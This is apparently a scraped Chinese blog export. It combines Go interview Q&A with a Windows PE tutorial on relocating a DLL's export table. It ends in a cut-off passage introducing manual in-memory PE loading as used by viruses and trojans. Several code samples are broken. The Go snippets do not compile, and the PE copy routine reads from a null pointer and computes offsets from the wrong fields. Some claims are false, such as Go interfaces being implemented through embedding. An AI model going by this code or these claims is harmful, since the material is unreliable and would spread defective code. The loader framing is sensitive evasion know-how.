123func main() &#123; fmt.Println(&amp;j, j) fmt.Println(&amp;i, i) // panic // Go语言中, 常量无法寻址, 是不能进行取指针操作的&#125; string和[]byte如何取舍string擅长的场景:需要字符串比较的场景;不需要nil字符串的场景; []byte擅长的场景修改字符串的场景, 尤其是修改粒度为1个字节;函数返回值, 需要用nil表示含义的场景;需要切片操作的场景; 字符串转成byte数组, 会发生内存拷贝吗 字符串转成切片, 会产生拷贝。严格来说, 只要是发生类型强化转都会发生内存拷贝。频繁的内存拷贝操作听起来对性能不太友好。有没有什么办法可以在字符串转成切片的时候不用发生拷贝呢? 代码实现1234567891011121314package mainimport ( &quot;fmt&quot; &quot;reflect&quot; &quot;unsafe&quot;)func main() &#123; a := &quot;aaa&quot; ssh := *(*reflect.StringHeader)(unsafe.Pointer(&amp;a)) b := *(*[]byte)(unsafe.Pointer(&amp;ssh)) fmt.Printf(&quot;%v&quot;, b)&#125; 解释 StringHeader是字符串在go的底层结构 1234type StringHeader struct &#123; Data uintptr Len int&#125; SliceHeader是切片在go的底层结构 12345type SliceHeader struct &#123; Data uintptr Len int Cap int&#125; 那么如果想要在底层转换二者, 只需要把StringHeader的地址强转成SliceHeader就行。那么go有个包很强的包叫unsafe。 unsafe.Pointer(&amp;a)方法可以得到变量a的地址; (*reflect.StringHeader)(unsafe.Pointer(&amp;a))可以把字符串a转成底层结构的形式; (*[]byte)(unsafe.Pointer(&amp;ssh))可以把ssh底层结构转成byte的切片的指针; 再通过*转成指针指向的实际内容; 翻转含有中文、数字、英文字符的字符串 翻转含有中文、数字、英文字母的字符串 代码实现12345678910111213141516package mainimport &quot;fmt&quot;func main() &#123; src := &quot;你好abc啊哈哈&quot; dst := reverse([]rune(src)) fmt.Printf(&quot;%v\\n&quot;, string(dst))&#125;func reverse(s []rune) []rune &#123; for i, j := 0, len(s)-1;i&lt;j; i,j = i+1, j-1 &#123; s[i], s[j] = s[j], s[i] &#125; return s&#125; 解释 rune关键字, 从golang源码中看出, 它是int32的别名(-2^31 ~ 2^31-1), 比如byte(-128 ~ 127), 可表示更多的字符。 由于rune可表示的范围更大, 所以能处理一切字符, 当然也包括中文字符。在平时计算中文字符, 可用rune。 因此将字符串转成rune的切片, 再进行翻转; json包变量不加tag会怎么样? json包里使用的时候, 结构体里的变量不加tag能不能正常转成json里的字段? 回答 如果变量首字母小写, 则为private。无论如何不能转, 因为取不到反射信息。 如果变量首字母大写, 则为public: 不加tag, 可以正常转为json里的字段, json内字段名跟结构体内字段原名一致; 加了tag, 从struct转json的时候, json的字段名就是tag里的字段名, 原字段名已经没用; 代码示例12345678910111213141516171819202122232425package mainimport ( &quot;encoding/json&quot; &quot;fmt&quot;)type J struct &#123; a string // 小写无tag b string `json:&quot;B&quot;` // 小写加tag C string // 大写无tag D string `json:&quot;DD&quot;` // 大写加tag&#125;func main() &#123; j := J &#123; a: &quot;1&quot;, b: &quot;2&quot;, C: &quot;3&quot;, D: &quot;4&quot;, &#125; fmt.Printf(&quot;转为json前j结构体的内容 = %+v\\n&quot;, j) // 转为json前j结构体的内容 = &#123; a:1 b:2 C:3 D:4 &#125; jsonInfo, _ := json.Marshal(j) fmt.Printf(&quot;转为json后的内容 = %+v\\n&quot;, string(jsonInfo)) // 转为json后的内容 = &#123; &quot;C&quot;: &quot;3&quot;, &quot;DD&quot;: &quot;4&quot; &#125;&#125; 解释 结构体里定义了四个字段, 分别对应小写无tag, 小写加tag、大写无tag、大写加tag; 转为json后首字母小写的不管加不加tag都不能转为json里的内容, 而大写的加了tag可以取别名, 不加tag则json内的字段跟结构体字段原名一致; Go语言中cap函数可以作用于哪些内容? array返回数组的元素个数 slice返回slice的最大容量 channel返回chennel的容量 Go语言的引用类型有什么? Go语言中的引用类型有func(函数类型)、interface(接口类型)、slice(切片类型)、map(字典类型)、channel(管道类型)、*(指针类型) for-select, 如果通道已经关闭会怎么样?如果select中只有一个case呢? for循环select时, 如果通道已经关闭会怎么样?如果select中的case只有一个, 又会怎么样? 回答 for循环select时, 如果其中一个case通道已经关闭, 则每次都会执行到这个case; 如果select里边只有一个case, 而这个case被关闭了, 则会出现死循环; 解释 for循环里被关闭的通道1234567891011121314151617181920212223242526272829package mainimport ( &quot;fmt&quot; &quot;time&quot;)const ( fmat = &quot;2006-01-02 15:04:05&quot;)func main() &#123; c := make(chan int) go func() &#123; time.Sleep(1 * time.Second) c &lt;- 10 close(c) &#125;() for &#123; select &#123; case x, ok := &lt;-c: fmt.Printf(&quot;%v, 通道读取到: x=%v, ok=%v\\n&quot;,time.Now().Format(fmat) x, ok) time.Sleep(500 * time.Millisecond) default: &#125; &#125;&#125; 输出结果123456789101112131415162024-02-27 22:29:44, 没读到信息进入default2024-02-27 22:29:44, 没读到信息进入default2024-02-27 22:29:45, 通道读取到: x=10, ok=true2024-02-27 22:29:45, 通道读取到: x=0, ok=false2024-02-27 22:29:46, 通道读取到: x=0, ok=false2024-02-27 22:29:46, 通道读取到: x=0, ok=false2024-02-27 22:29:47, 通道读取到: x=0, ok=false2024-02-27 22:29:47, 通道读取到: x=0, ok=false2024-02-27 22:29:48, 通道读取到: x=0, ok=false2024-02-27 22:29:48, 通道读取到: x=0, ok=false2024-02-27 22:29:49, 通道读取到: x=0, ok=false2024-02-27 22:29:49, 通道读取到: x=0, ok=false2024-02-27 22:29:50, 通道读取到: x=0, ok=false2024-02-27 22:29:50, 通道读取到: x=0, ok=false2024-02-27 22:29:51, 通道读取到: x=0, ok=false2024-02-27 22:29:51, 通道读取到: x=0, ok=false c通道是一个缓冲为0的通道, 在main开始时, 启动一个协程对c通道写入10, 然后就关闭掉这个通道; 在main中通过通过x, ok := &lt;-c接受通道c里的值, 从输出结果里看出, 确实从通道里读出了之前塞入通道的10, 但是这个通道关闭后, 这个通道一直能读出内容; 怎样才能不读关闭后的通道123456789101112131415161718192021222324252627282930313233package mainimport ( &quot;fmt&quot; &quot;time&quot;)const ( fmat = &quot;2006-01-02 15:04:05&quot;)func main() &#123; c := make(chan int) go func() &#123; time.Sleep(1 * time.Second) c &lt;- 10 close(c) &#125;() for &#123; select &#123; case x, ok := &lt;-c: fmt.Printf(&quot;%v, 通道读取到: x=%v, ok=%v\\n&quot;, time.Now().Format(fmat), x, ok) time.Sleep(500 * time.Millisecond) if !ok &#123; c = nil // 把关闭后的通道赋值为nil, 则select读取则会阻塞 &#125; default: fmt.Printf(&quot;%v, 没读到信息进入default\\n&quot;, time.Now().Format(fmat)) time.Sleep(500 * time.Millisecond) &#125; &#125;&#125; 输出结果123456789102024-02-27 23:08:06, 没读到信息进入default2024-02-27 23:08:07, 没读到信息进入default2024-02-27 23:08:07, 通道读取到: x=10, ok=true2024-02-27 23:08:08, 通道读取到: x=0, ok=false2024-02-27 23:08:08, 没读到信息进入default2024-02-27 23:08:09, 没读到信息进入default2024-02-27 23:08:09, 没读到信息进入default2024-02-27 23:08:10, 没读到信息进入default2024-02-27 23:08:10, 没读到信息进入default2024-02-27 23:08:11, 没读到信息进入default go的内存逃逸是什么? 什么情况下会发生内存逃逸?回答golang程序变量会携带有一组校验数据, 用来证明它的整个生命周期是否在运行时完全可知。如果变量通过了这些校验, 它就可以在栈上分配, 否则就说它逃逸了, 必须在堆上分配。 能引起变量逃逸到堆上的典型情况: 在方法内把局部变量指针返回: 局部变量原本应该在栈中分配, 在栈中回收。但是由于返回时被外部调用, 因此其生命周期大于栈, 则溢出; 发送指针或带有指针的值到chennel中: 在编译时, 是没有办法知道哪个goroutinue会在channel上接收数据。所以编译器没法知道变量什么时候才会释放; 在一个切片上存储指针或带指针的值: 一个典型的例子就是[]*string。这会导致切片内容逃逸。尽管其后面的数组可能是在栈上分配的, 但其引用的值一定是在堆上; slice的背后数组被重新分配了, 因为append时可能会超出其容量(cap): slice初始化的地方在编译时是可以知道的, 它最开始会在栈上分配。如果切片背后的存储要基于运行时的数据进行扩充, 就会在堆上分配; 在interface类型上调用方法: 在interface类型上调用方法都是动态调度的–方法的真正实现只能在运行时知道。想象一个io.Reader类型的变量r, 调用r.Read(b)会使得r的值和切片b背后存储的数据逃逸掉, 所以会在堆上分配; 代码举例 通过一个例子加深理解, 接下来尝试怎么通过go build -gcflags=-m查看逃逸的情况 123456789101112131415161718192021package mainimport &quot;fmt&quot;type A struct &#123; s string&#125;func foo(s string) *A &#123; a := new(A) a.s = s return a // 返回局部变量a, 在C语言为野指针, 在golang则ok但a会逃逸到堆&#125;func main() &#123; a := foo(&quot;hello&quot;) b := a.s + &quot;world&quot; c := b + &quot;!&quot; fmt.Println(c)&#125; 执行go build -gcflags=-m test_Demo_01.go 123456789101112go build -gcflags=-m test_Demo_01.go# command-line-arguments./test_Demo_01.go:9:6: can inline foo./test_Demo_01.go:16:10: inlining call to foo./test_Demo_01.go:20:13: inlining call to fmt.Println./test_Demo_01.go:9:10: leaking param: s./test_Demo_01.go:10:10: new(A) escapes to heap./test_Demo_01.go:16:10: new(A) does not escape./test_Demo_01.go:17:11: a.s + &quot;world&quot; does not escape./test_Demo_01.go:18:9: b + &quot;!&quot; escapes to heap./test_Demo_01.go:20:13: ... argument does not escape./test_Demo_01.go:20:14: c escapes to heap ./test_Demo_01.go:10:10: new(A) escapes to heap说明new(A)逃逸了, 符合上述提到的常见情况的第一种; ./test_Demo_01.go:17:11: a.s + &quot;world&quot; does not escape 说明b变量没有逃逸, 因为它只存在方法内存中, 会在方法结束时被回收; ./test_Demo_01.go:18:9: b + &quot;!&quot; escapes to heap说明c变量逃逸, 通过fmt.Println(a ...interface&#123;&#125;)打印的变量, 都会发生逃逸; Go关键字fallthrough有什么作用 fallthrough关键字只能用在switch中, 且只能在每一个case分支中的最后一行, 作用是如果这个case分支被执行, 将继续执行下一个case分支, 而且不会取判断下一个分支额case条件是否成立; 12345678910111213141516171819202122package mainimport mainfunc main() &#123; switch &quot;a&quot; &#123; case &quot;a&quot; fmt.Println(&quot;匹配a&quot;) fallthrough case &quot;b&quot;: fmt.Println(&quot;a成功了, 也执行b分支&quot;) case &quot;c&quot;: fmt.Println(&quot;a成功了, c分支会执行吗&quot;) default: fmt.Println(&quot;默认执行&quot;) &#125;&#125;/** 匹配a a成功了, 也执行b分支 */ 空结构体占不占内存空间? 为什么使用空结构体? 空结构体是没有内存大小的结构体; 通过unsafe.Sizeof()可以查看空结构体的宽度, 代码如下: 12var s struct&#123;&#125;fmt.Println(unsafe.Sizeof(s)) // printfs 0 准确的来说, 空结构体有一个特殊起点: zerobase变量; zerobase是一个占用8个字节的uintptr全局变量。每次定义struct&#123;&#125;类型的变量, 编译器只是把zerobase变量的地址给出去。也就是说空结构体的变量的内存地址都是一样的。 空结构体的使用场景主要有三种: 实现方法接收者: 在业务场景下, 我们需要将方法组合起来, 代表其一个”分组”的, 便于后续拓展和维护; 实现集合类型: 在Go语言的标准库中并没有提供集合(Set)的相关实现, 因此一般在代码中图方便, 会直接用map来替代: type Set map[string]struct&#123;&#125;。 实现通道: 在Go channel的使用场景中, 常常会遇到通知型channel, 其不需要发送任何数据, 只是用于协调Goroutinue的运行, 用于流转各类状态或是控制并发情况; Go语言中, 下面哪个关于指针的说法是错误的? 指针不能进行算术运算 指针可以比较 指针可以是nil 指针可以指向任何类型 针对在Go语言中只能指向相同类型的结构体或者基本类型。例如，一个int类型的变量, 只能指向int类型的指针。如果尝试将一个不同类型的指针赋给一个变量, 将会导致编译错误。 Go语言的接口类型是如何实现的? 在Go语言中, 接口类型是通过**类型嵌入(embedding)**的方式实现的。每个实现了接口的类型的结构体中都有一个隐含的成员, 该成员是指向接口类型的指针。通过这种方式, 接口实现了堆类型的约束和定义。 具体来说, 当一个类型实现了某个接口的所有方法后, 该类型就被认为是实现了该接口。结构体中, 可以通过嵌入接口类型的方式来实现接口方法。在实现接口方法时, 方法的签名需要与接口定义中的方法签名保持一致。 Go string的底层实现源码包src&#x2F;runTime&#x2F;string.go stringStruct定义了string的数据结构 1234Type stringStruct struct &#123; str unsafe.Pointer // 字符串的首地址 len int // 字符串的长度&#125; 声明:如下代码所示, 可以声明一个string变量赋予初值 12var str stringstr = &quot;hello world&quot; 字符串构建过程是根据字符串构建stringStruct, 再转化成string, 转化源码如下: 12345678func gostringnocopy(str *byte) string &#123; ss := stringStruct&#123; // 先构造stringStruct str: unsafe.Pointer(str), len: findnull(str) &#125; s := *(*string)(unsafe.Pointer(&amp;ss)) // 再将stringStruct转换成string return s&#125; Go如何避免panic 首先明确panic定义: go把真正的异常叫做panic, 是指出现重大错误, 比如数据越界之类的编程BUG或者是那些需要人工介入才能修复的问题, 比如程序启动时加载资源出错等等。 几个容易出现panic的点: 函数返回值或参数为指针类型, nil, 未初始化结构体, 此时调用容易出现panic, 可加 !&#x3D;nil 进行判断; 数组切片越界 如果我们关闭未初始化通道, 重复关闭通道, 向已经关闭的通道中发送数据, 这三种情况会引发panic, 导致程序崩溃; 如果我们直接操作未初始化的映射(map), 也会引发panic, 导致程序崩溃; 另外, 操作映射可能会遇到的更为严重的一个问题是, 同时对同一个映射并发读写, 它会触发runtime.throw, 不像panic可以使用recover捕获。所以, 我们再对同一个映射并发读写时, 一定要使用锁; 如果类型断言使用不当, 比如我们不接受布尔值的话, 类型断言失败也会引发panic, 导致程序崩溃; 如果很多时候不可避免地出现了panic, 记得使用defer&#x2F;recover; 空结构体的使用场景 空结构体(empty struct)是在Go语言中一个特殊地概念, 它没有任何字段。在Go中, 它通常被称为匿名结构体或零宽度结构体。尽管没有字段, 但它在某些请款下仍然有其他用途 1. 占位符 空结构体可以用作占位符, 用于表示某个数据结构或数据集合地存在而不实际存储任何数据。这在某些数据结构的实现中非常有用, 特别是要实现某种数据结构的集合或映射时, 但并不需要存储实际的值。 123// 表示集合中是否包含某个元素的映射set := make(map[string]struct&#123;&#125;)set[&quot;apple&quot;] = struct&#123;&#125;&#123;&#125; 2. 信号量 空结构体可以用作信号量, 用于控制并发操作。通过向通道发送或接收空结构体, 可以实现信号的传递和同步; 123456789// 用通道作为信号量semaphore := make(chan struct&#123;&#125;, 5) // 控制并发数为5go func() &#123; semaphore &lt;- struct&#123;&#125;&#123;&#125; // 获取信号量 defer func() &#123; &lt;- semaphero &#125;() // 释放信号量 // 执行并发操作&#125;() 3.强调结构 有时, 空结构体可用于强调某个结构的重要性或存在。它可以用作结构体的标签, 表示关注该结构的存在而不是其内容; 1234567// 表示一篇文章的元信息, 不包含实际内容type Article struct &#123; Title string Author string PublishedAt time.Time MetaData struct&#123;&#125; // 空结构体强调元信息的存在&#125; 4. JSON序列化 在处理JSON数据时, 有时需要表示一个空对象, 可以使用空结构体来表示JSON中的空对象&#123;&#125;; 123emptyJSON := struct&#123;&#125;&#123;&#125;jsonBytes, _ := json.Marshal(emptyJSON)fmt.Println(string(jsonBytes)) // 输出: &#123;&#125; 尽管空结构体没有字段, 但它在上述情况下提供了一种轻量级的方式来处理特定的需求, 而无需分配额外的内存或定义具体的数据结构。 struct的特点: 用来自定义复杂数据结构; struct里面可以包含多个字段(属性); struct类型可以定义方法, 注意和函数的区分; struct类型是值类型; struct类型可以嵌套; Go语言没有calss类型, 只有struct类型; 特殊之处: 结构体是用户单独定义的类型, 不能和其他类型进行强制转换; golang中的struct没有构造函数, 一般可以使用工厂模式来解决这个问题; 我们可以为struct的每个字段, 写上一个tag。这个tag可以通过反射的机制获取到, 最常用的场景就是json序列化和反序列化; 结构体中的字段可以没有名字, 即匿名字段;","categories":[{"name":"Golang","slug":"Golang","permalink":"http://example.com/categories/Golang/"}],"tags":[{"name":"Golang","slug":"Golang","permalink":"http://example.com/tags/Golang/"}]},{"title":"移动导出表","slug":"移动导出表","date":"2024-01-03T12:51:25.000Z","updated":"2024-07-01T15:23:01.410Z","comments":true,"path":"cfe5db75.html","link":"","permalink":"http://example.com/cfe5db75.html","excerpt":"为什么要移动导出表导出表由编译器生成, 导出表中存储了该PE文件有哪些导出函数以及函数的地址;在程序启动时, 系统会根据导出表做初始工作; 将用到的Dll中的函数地址存储到IAT表中;为了保护程序, 可以对.EXE的二进制代码进行加密操作;如果进行加密, 各种表的信息以及数据是混在一起的, 加密后会导致程序无法正常执行;因此需要新增一个节, 并将PE中的表移动到新节中, 然后将代码和数据进行加密;","text":"为什么要移动导出表导出表由编译器生成, 导出表中存储了该PE文件有哪些导出函数以及函数的地址;在程序启动时, 系统会根据导出表做初始工作; 将用到的Dll中的函数地址存储到IAT表中;为了保护程序, 可以对.EXE的二进制代码进行加密操作;如果进行加密, 各种表的信息以及数据是混在一起的, 加密后会导致程序无法正常执行;因此需要新增一个节, 并将PE中的表移动到新节中, 然后将代码和数据进行加密; 移动导出表步骤移动导出表步骤读取Dll文件并在FileBuffer中新增一个节(.export);复制AddressOfFunctions(函数地址表); 长度: NumberOfFunctions * 4;复制AddressOfNameOrdinals(函数序号表);长度: NumberOfNames * 2;复制AddressOfNames(函数名称表);长度: NumberOfNames * 4;复制所有函数名;长度不确定, 复制时直接修复AddressOfNames;复制IMAGE_EXPORT_DIRECTORY结构;修复IMAGE_EXPORT_DIRECTORY结构中的AddressOfFunctions、AddressOfNameOrdinals、AddressOfNames;修复目录项中的值, 指向新的IMAGE_EXPORT_DIRECTORY; RVA转FOA 将RVA转换成FOA 123456789101112131415161718DWORD RVA2FOA(DWORD dwRVA, LPVOID lpBuffer)&#123; PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpBuffer; PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + (DWORD)pDos); IMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt); if(dwRVA &lt; pSec[0].VirtualAddress) &#123; return dwRVA; &#125; for(size_t i=0; i&lt;pNt-&gt;FileHeader.NumberOfSections; i++) &#123; if(dwRVA &gt;= pSec[i].VirtualAddress &amp;&amp; dwRVA &lt;= pSec[i].VirtualAddress + pSec[i].Misc.VirtualSize) &#123; return dwRVA - pSec[i].VirtualAddress + pSec[i].PointerToRawData; &#125; &#125; return dwRVA;&#125; FOA转RVA 将FOA转换成RVA 123456789101112131415161718DWORD FOA2RVA(DWORD dwFOA, LPVOID lpBuffer)&#123; IMAGE_DOS_HEADER pDos = (IMAGE_DOS_HEADER)lpBuffer; IMAGE_NT_HEADERS pNt = (IMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + (DWORD)pDos); IMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt); if(dwFOA &lt; pSec[0].PointerToRawData) &#123; return dwFOA; &#125; for(size_t i=0;i&lt;pNt-&gt;FileHeader.NumberOfSections;i++) &#123; if(dwFOA &gt;= pSec[i].PointerToRawData &amp;&amp; dwFOA &lt; (pSec[i].PointerToRawData + pSec[i].SizeOfRawData)) &#123; return pSec[i].VirtualAddress + dwFOA - pSec[i].PointerToRawData; &#125; &#125; return dwFOA;&#125; 移动导出表具体步骤1. 将Dll文件读入内存123456789101112131415161718192021222324252627282930char* szFilePath = &quot;xxx&quot;;HANDLE hFile = CreateFileA( szFilePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_ARCHIVE, NULL);if(hFile == INVALID_HANDLE_VALUE)&#123; printf(&quot;CreateFileA Failed\\n&quot;); return 0;&#125;DWORD dwFileSize = GetFileSize(hFile, NULL);printf(&quot;dwFileSize: %d\\n&quot;, dwFileSize);LPVOID lpData = new BYTE[dwFileSize];if(lpData == NULL)&#123; printf(&quot;申请内存失败\\n&quot;); return 0;&#125;DWORD dwRead = 0;if(FALSE == ReadFile(hFile, lpData, dwFileSize, &amp;dwRead, NULL))&#123; printf(&quot;ReadFile Failed\\n&quot;); return 0;&#125;printf(&quot;lpData: %x\\n&quot;, *(short*)lpData); 2. 新增节表1234567891011121314151617181920212223242526272829// 解析PE文件IMAGE_DOS_HEADER pDos = (IMAGE_DOS_HEADER)lpData;IMAGE_NT_HEADERS pNt = (IMAGE_NT_HAEDERS)(pDos-&gt;e_lfanew + (DWORD)lpData);PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);// 新增节表PIMAGE_SECTION_HEADER pNewSec = pSec + pNt-&gt;FileHeader.NumberOfSections;if(((DWORD)lpData + pNt-&gt;OptionalHeader.SizeOfHeaders - (DWORD)pNewSec) &lt; 80)&#123; printf(&quot;空间不足新增节表失败\\n&quot;); return 0;&#125;// 设置新接节表strcpy((char*)(pNewSec-&gt;Name), &quot;.export&quot;);pNewSec-&gt;Misc.VirtualSize = 0x1000;pNewSec-&gt;VirtualAddress = pNt-&gt;OptionalHeader.SizeOfImage;pNewSec-&gt;SizeOfRawData = 0x1000;PIMAGE_SECTION_HEADER pLastSec = pSec + (pNt-&gt;FileHeader.NumberOfSections - 1);pNewSec-&gt;PointerToRawData = pLastSec-&gt;PointerToRawData + pLastSec-&gt;SizeOfRawData;pNewSec-&gt;Characteristics = pSec[1].Characteristics;// 设置全0节表memset((LPVOID)(pNewSec + 1), 0, 40);// 修正头部信息pNt-&gt;FileHeader.NumberOfSections += 1;pNt-&gt;OptionalHeader.SizeOfImage += 0x1000; 3. 复制导出表12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061// 申请内存LPVOID lpSecMemory = new BYTE[0x1000];if(lpSecMemory == NULL)&#123; printf(&quot;申请内存失败\\n&quot;); return 0;&#125;// 解析导出表PIMAGE_DATA_DIRECTORY pDir = (PIMAGE_DATA_DIRECTORY)(pNt-&gt;OptionalHeader.DataDirectory + IMAGE_DIRECTORY_ENTRY_EXPORT);PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)(RVA2FOA(pDir-&gt;VirtualAddress, lpData) + (DWORD)lpData);printf(&quot;NumberOfNames: %d\\n&quot;, pExport-&gt;NumberOfNames);// 复制函数地址表// 长度 NumberOfFunctions * 4LPVOID lpCopyDest = lpSecMemory;LPDWORD lpNewFuncAddr = (LPDWORD)lpCopyDest;LPVOID lpFuncAddr = (LPVOID)(RVA2FOA(pExport-&gt;AddressOfFunctions, lpData) + (DWORD)lpData);memcpy(lpCopyDest, lpFuncAddr, pExport-&gt;NumberOfFunctions * 4);printf(&quot;lpSecMemory =&gt; AddressOfFunctions: %x\\n&quot;, *(int*)lpSecMemory);printf(&quot;pExport-&gt;AddressOfFuntions: %x\\n&quot;, *(int*)(RVA2FOA(pExport-&gt;AddressOfFunctions, lpData) + (DWORD)lpData));// 复制函数序号表// 长度 NumberOfNames * 2lpCopyDest = (LPVOID)((DWORD)lpSecMemory + pExport-&gt;AddressOfFunctions * 4);LPDWORD lpNewOrdAddr = (LPDWORD)lpCopyDest;LPVOID lpOrdAddr = (LPVOID)(RVA2FOA(pExport-&gt;AddressOfNameOrdinals, lpData) + (DWORD)lpData);memcpy(lpCopyDest, lpOrdAddr, pExport-&gt;NumberOfNames * 2);printf(&quot;lpSecMemory =&gt; AddressOfNameOrdinals: %x\\n&quot;, *(char*)((DWORD)lpSecMemory + pExport-&gt;NumberOfFunctions * 4));printf(&quot;pExport-&gt;AddressOfNameOrdinals: %x\\n&quot;, *(char*)(RVA2FOA(pExport-&gt;AddressOfNameOrdinals, lpData) + (DWORD)lpData));// 复制函数名称表// 长度 NumberOfNames * 4lpCopyDest = (LPVOID)((DWORD)lpSecMemory + pExport-&gt;NumberOfNames * 2);LPDWORD lpNewNameAddr = (LPDWORD)lpCopyDest;LPDWORD lpNameAddr = (LPDWORD)(RVA2FOA(pExport-&gt;AddressOfNames, lpData) + (DWORD)lpData);memcpy(lpCopyDest, 0, pExport-&gt;NumberOfNames * 4);// 复制函数名称并修复名称表lpCopyDest = (LPVOID)((DWORD)lpSecMemory + pExport-&gt;NumberOfNames * 4);for(size_t i=0; i&lt;pExoprt-&gt;NumberOfNames; i++)&#123; LPSTR lpFuncName = (LPSTR)(RVA2FOA(lpNameAddr[i], lpData) + (DWORD)lpData); printf(&quot;lpFuncName: %s\\n&quot;, lpFuncName); DWORD dwFuncLen = strlen(lpFuncName) + 1; memcpy(lpCopyDest, lpFuncName, dwFuncLen); *(lpNewFuncAddr + i) = FOA2RVA((dwFileSize + (DWORD)lpCopyDest - (DWORD)lpSecMemory), lpData); lpCopyDest = (LPVOID)((DWORD)lpCopyDest + dwFuncLen);&#125;printf(&quot;lpSecMemory =&gt; AddressOfNames: %s\\n&quot;, ((DWORD)lpSecMemory + pExport-&gt;NumberOfFunctions * 4 + pExport-&gt;NumberOfNames * 2 + pExport-&gt;NumberOfNames * 4));printf(&quot;pExport-&gt;AddressName: %s\\n&quot;, (RVA2FOA(lpNewFuncAddr[0], lpData) + (DWORD)lpData));// 复制导出表memcpy(lpCopyDest, pExport, pDir-&gt;Size);PIMAGE_EXPORT_DIRECTORY pNewExport = (PIMAGE_EXPORT_DIRECTORY)lpCopyDest;pNewExport-&gt;AddressOfFunctions = FOA2RVA((dwFileSize + (DWORD)lpNewFuncAddr - (DWORD)lpSecMemory), lpData);pNewExoprt-&gt;AddressOfNameOrdinals = FOA2RVA((dwFileSize + (DWORD)lpNewOrdAddr - (DWORD)lpSecMemory), lpData);pNewExport-&gt;AddressOfNames = FOA2RVA((dwFileSize + (DWORD)lpNewNameAddr - (DWORD)lpSecMemory), lpData);// 修复数据目录pNt-&gt;OptionalHeader.DataDirectory[0].VirtualAddress = FOA2RVA((dwFileSize + (DWORD)pNewExport - (DWORD)lpSecMemory), lpData); 4. 将数据写入文件1234567891011121314151617181920212223242526FILE* newFile = fopen(&quot;xxx&quot;, &quot;a+b&quot;);if(!newFile)&#123; printf(&quot;打开新文件失败\\n&quot;); return 0;&#125;size_t m = fwrite(lpData, dwFileSize, 1, newFile);if(!m)&#123; printf(&quot;写出文件第一部分失败\\n&quot;); fclose(newFile); return 0;&#125;// 写出新节size_t n = fwrite(lpSecMemory, 0x1000, 1 , newFile);if(!n)&#123; printf(&quot;写出文件第二部分失败\\n&quot;); fclose(newFile); return 0;&#125;// 关闭文件并返回fclose(newFile);printf(&quot;移动导出表成功\\n&quot;);return 0; 5. 调用新导出表12345678910typedef void (*MyShowMessage)();HMODULE hDll = LoadLibraryA(&quot;xxx&quot;);if(hDll == NULL)&#123; printf(&quot;LoadLibrary Failed\\n&quot;); return 0;&#125;MyShowMessage myShowMessage = (MyShowMessage)GetProcAddress(hDll, &quot;ShowMessage&quot;);myShowMessage();FreeLibrary(hDll); 运行成功 dllmain.cpp1234567891011121314151617181920212223242526// dllmain.cpp : 定义 DLL 应用程序的入口点。#include &quot;pch.h&quot;#include &lt;Windows.h&gt;extern &quot;C&quot; __declspec(dllexport) void ShowMessage()&#123; MessageBox(NULL, L&quot;I`m DLL File&quot;, L&quot;HELLO&quot;, MB_OK);&#125;BOOL APIENTRY DllMain( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved )&#123; switch (ul_reason_for_call) &#123; case DLL_PROCESS_ATTACH: case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: break; &#125; return TRUE;&#125;","categories":[{"name":"Windows PE","slug":"Windows-PE","permalink":"http://example.com/categories/Windows-PE/"}],"tags":[{"name":"Windows PE","slug":"Windows-PE","permalink":"http://example.com/tags/Windows-PE/"}]},{"title":"手工模拟PE加载器","slug":"手工模拟PE加载器","date":"2023-12-14T13:13:16.000Z","updated":"2024-08-13T08:24:00.378Z","comments":true,"path":"dbdbea24.html","link":"","permalink":"http://example.com/dbdbea24.html","excerpt":"内存直接加载运行病毒木马具有模拟PE加载器的功能, 它们可以把DLL或者exe等PE文件从内存中直接加载到病毒木马的内存中去执行, 不需要通过LoadLibrary等现成的API函数去操作;假如程序需要动态调用DLL文件, 内存加载运行技术可以把DLL作为资源插入到自己的程序中, 此时可直接在内存中加载运行即可;内存加载技术的核心就在于模拟PE加载器PE文件, 也就是对导入表、导出表、重定位表的操作过程;","text":"内存直接加载运行病毒木马具有模拟PE加载器的功能, 它们可以把DLL或者exe等PE文件从内存中直接加载到病毒木马的内存中去执行, 不需要通过LoadLibrary等现成的API函数去操作;假如程序需要动态调用DLL文件, 内存加载运行技术可以把DLL作为资源插入到自己的程序中, 此时可直接在内存中加载运行即可;内存加载技术的核心就在于模拟PE加载器PE文件, 也就是对导入表、导出表、重定位表的操作过程; 实现原理首先, 需要将DLL文件加载到内存中, 按照映像大小进行对齐后映射到内存中, 然后根据重定位表修改硬编码数据, 最后根据导出表函数地址修正导入表; 流程总结根据映像大小SizeOfImage申请可读可写可执行的内存空间, 首地址即DLL加载基址;获取其映像对齐大小SectionAlignment并复制到该内存空间中（FileBuffer &#x3D;&gt; ImageBuffer）;修正重定位表;修正导入表, 根据PE结构中的导入表, 加载所需的Dll, 并获取导入函数的地址将其写入导入表中;修改DLL的加载基址ImageBase;获取DLL入口地址, 构造DllMain函数实现加载; 对于exe文件, 重定位表不是必须的。因为对于exe进程来说, 进程最早加载的模块是exe模块, 所以它可以按照默认加载基址加载到内存中; exe和Dll唯一的区别在于构造入口函数的差别, exe不需要构造入口函数, 而是根据PE结构获取exe的入口地址偏移AddressOfEntryPoint并计算出入口地址, 然后直接跳转。 1. 将Dll文件读入内存PELodader_Demo.cpp1234567891011121314151617181920212223242526272829303132wchat_t szFileName[MAX_PATH] = L&quot;C:\\\\Users\\\\dell\\\\OneDrive\\\\桌面\\\\哔哩哔哩学习\\\\PE Learn\\\\PELoader_Demo\\\\Debug\\\\TestDLL_01.dll&quot;;HANDLE hFile = CreateFile( szFileName, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_ARCHIVE, NULL);if (hFile == INVALID_HANDLE_VALUE)&#123; printf(&quot;CreateFile Failed\\n&quot;); return 1;&#125;DWORD dwFileSize = 